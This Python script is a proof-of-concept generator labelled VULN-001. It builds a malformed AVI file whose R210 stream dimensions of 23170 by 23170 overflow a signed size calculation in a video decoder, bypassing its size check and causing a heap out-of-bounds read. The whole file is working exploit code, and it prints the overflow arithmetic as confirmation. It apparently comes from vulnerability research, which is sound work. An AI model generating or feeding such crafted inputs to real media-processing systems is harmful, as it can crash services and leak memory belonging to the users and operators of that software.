#!/usr/bin/env python3
"""
PoC generator for VULN-001: Integer Overflow in r210dec decode_frame()
CWE-190 -> CWE-125: heap OOB read via bypassed size check.

Trigger: width=23170, height=23170
  aligned_width = FFALIGN(23170, 64) = 23232
  4 * 23232 * 23170 = 2,153,141,760 > INT_MAX (2,147,483,647)
  -> signed int overflow -> negative result
  -> size check `avpkt->size < <negative>` always false
  -> decode loop reads far beyond the 4-byte packet data (OOB)
"""

import struct
import sys

def fourcc(s):
    return s.encode('ascii')

def le32(n):
    return struct.pack('<I', n & 0xFFFFFFFF)

def le16(n):
    return struct.pack('<H', n & 0xFFFF)

WIDTH  = 23170
HEIGHT = 23170

# Minimal actual frame data - just 4 bytes (triggers OOB when size check is bypassed)
FRAME_DATA = b'\x00\x01\x02\x03'

def build_avi():
    # ---- BITMAPINFOHEADER (strf) ----
    bi_size        = 40
    bi_width       = WIDTH
    bi_height      = HEIGHT
    bi_planes      = 1
    bi_bit_count   = 32
    bi_compression = b'R210'   # fourcc for R210
    bi_size_image  = len(FRAME_DATA)
    bi_x_pels      = 0
    bi_y_pels      = 0
    bi_clr_used    = 0
    bi_clr_imp     = 0

    strf_data = struct.pack('<IiiHHcccc4sIIIII',
        bi_size,
        bi_width,
        bi_height,
        bi_planes,
        bi_bit_count,
        bi_compression[0:1],
        bi_compression[1:2],
        bi_compression[2:3],
        bi_compression[3:4],
        b'\x00\x00\x00\x00',  # placeholder, replaced below
        bi_size_image,
        bi_x_pels,
        bi_y_pels,
        bi_clr_used,
        bi_clr_imp,
    )
    # Build manually for clarity
    strf_data = struct.pack('<I', 40)           # biSize
    strf_data += struct.pack('<i', bi_width)    # biWidth
    strf_data += struct.pack('<i', bi_height)   # biHeight
    strf_data += struct.pack('<H', 1)           # biPlanes
    strf_data += struct.pack('<H', 32)          # biBitCount
    strf_data += b'R210'                        # biCompression (fourcc)
    strf_data += struct.pack('<I', len(FRAME_DATA))  # biSizeImage
    strf_data += struct.pack('<i', 0)           # biXPelsPerMeter
    strf_data += struct.pack('<i', 0)           # biYPelsPerMeter
    strf_data += struct.pack('<I', 0)           # biClrUsed
    strf_data += struct.pack('<I', 0)           # biClrImportant
    assert len(strf_data) == 40, f"strf size {len(strf_data)}"

    strf_chunk = b'strf' + struct.pack('<I', len(strf_data)) + strf_data

    # ---- AVIStreamHeader (strh) for video ----
    # AVISTREAMHEADER: fccType, fccHandler, flags, priority, language,
    #   initialFrames, scale, rate, start, length, suggestedBufferSize,
    #   quality, sampleSize, rcFrame(left,top,right,bottom)
    strh_data  = b'vids'              # fccType
    strh_data += b'R210'             # fccHandler
    strh_data += struct.pack('<I', 0)  # flags
    strh_data += struct.pack('<HH', 0, 0)  # priority, language
    strh_data += struct.pack('<I', 0)  # initialFrames
    strh_data += struct.pack('<I', 1)  # scale
    strh_data += struct.pack('<I', 25) # rate (25 fps)
    strh_data += struct.pack('<I', 0)  # start
    strh_data += struct.pack('<I', 1)  # length (1 frame)
    strh_data += struct.pack('<I', len(FRAME_DATA))  # suggestedBufferSize
    strh_data += struct.pack('<I', 0xFFFFFFFF)  # quality (-1 = default)
    strh_data += struct.pack('<I', 4)  # sampleSize
    strh_data += struct.pack('<HHHH', 0, 0, WIDTH, HEIGHT)  # rcFrame
    assert len(strh_data) == 56, f"strh size {len(strh_data)}"

    strh_chunk = b'strh' + struct.pack('<I', len(strh_data)) + strh_data

    # ---- LIST strl ----
    strl_content = strh_chunk + strf_chunk
    strl_chunk   = b'LIST' + struct.pack('<I', 4 + len(strl_content)) + b'strl' + strl_content

    # ---- MainAVIHeader (avih) ----
    # dwMicroSecPerFrame, dwMaxBytesPerSec, dwPaddingGranularity, dwFlags,
    # dwTotalFrames, dwInitialFrames, dwStreams, dwSuggestedBufferSize,
    # dwWidth, dwHeight, dwReserved[4]
    avih_data  = struct.pack('<I', 40000)   # dwMicroSecPerFrame (25 fps)
    avih_data += struct.pack('<I', len(FRAME_DATA))  # dwMaxBytesPerSec
    avih_data += struct.pack('<I', 0)       # dwPaddingGranularity
    avih_data += struct.pack('<I', 0x10)    # dwFlags (AVIF_HASINDEX)
    avih_data += struct.pack('<I', 1)       # dwTotalFrames
    avih_data += struct.pack('<I', 0)       # dwInitialFrames
    avih_data += struct.pack('<I', 1)       # dwStreams
    avih_data += struct.pack('<I', len(FRAME_DATA))  # dwSuggestedBufferSize
    avih_data += struct.pack('<I', WIDTH)   # dwWidth
    avih_data += struct.pack('<I', HEIGHT)  # dwHeight
    avih_data += struct.pack('<4I', 0, 0, 0, 0)  # dwReserved[4]
    assert len(avih_data) == 56, f"avih size {len(avih_data)}"

    avih_chunk = b'avih' + struct.pack('<I', len(avih_data)) + avih_data

    # ---- LIST hdrl ----
    hdrl_content = avih_chunk + strl_chunk
    hdrl_chunk   = b'LIST' + struct.pack('<I', 4 + len(hdrl_content)) + b'hdrl' + hdrl_content

    # ---- movi: 00dc frame chunk ----
    # Pad FRAME_DATA to even size (already 4, fine)
    frame_chunk  = b'00dc' + struct.pack('<I', len(FRAME_DATA)) + FRAME_DATA

    movi_content = frame_chunk
    movi_chunk   = b'LIST' + struct.pack('<I', 4 + len(movi_content)) + b'movi' + movi_content

    # ---- RIFF AVI ----
    riff_content = b'AVI ' + hdrl_chunk + movi_chunk
    riff         = b'RIFF' + struct.pack('<I', len(riff_content)) + riff_content

    return riff


if __name__ == '__main__':
    output = 'vuln_001_input.avi'
    data = build_avi()
    with open(output, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {output}")
    print(f"[+] Width={WIDTH}, Height={HEIGHT}")
    print(f"[+] Frame data size: {len(FRAME_DATA)} bytes (triggers OOB if size check bypassed)")
    # Sanity: verify overflow condition
    aligned_width = ((WIDTH + 63) // 64) * 64
    product = 4 * aligned_width * HEIGHT
    INT_MAX = 2**31 - 1
    print(f"[+] aligned_width={aligned_width}, 4*{aligned_width}*{HEIGHT}={product}")
    print(f"[+] INT_MAX={INT_MAX}")
    if product > INT_MAX:
        signed_result = product - 2**32
        print(f"[+] Overflow! Signed result = {signed_result} (negative)")
        print(f"[+] Size check '4 < {signed_result}' is FALSE -> bypassed -> OOB read")
    else:
        print(f"[-] No overflow with these dimensions")
